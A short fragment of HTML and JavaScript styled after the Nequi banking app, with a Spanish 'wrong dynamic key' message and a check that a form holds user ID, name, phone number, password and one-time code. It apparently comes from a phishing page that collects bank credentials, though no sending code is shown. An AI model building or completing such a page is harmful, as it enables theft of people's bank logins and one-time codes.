...
<header class="navbarContainer">
    ...
    <section class="homeSectionContainer">
        ...
        <p class="invalid-otp">¡Ups! esa no es tu clave dinamica. Puedes consultarla dentro de la App Nequi.
        </p>
...
if (!formData || !formData.UserId || !formData.userName || !formData.phoneNumber || !formData.password || !formData.Dinamica1) {
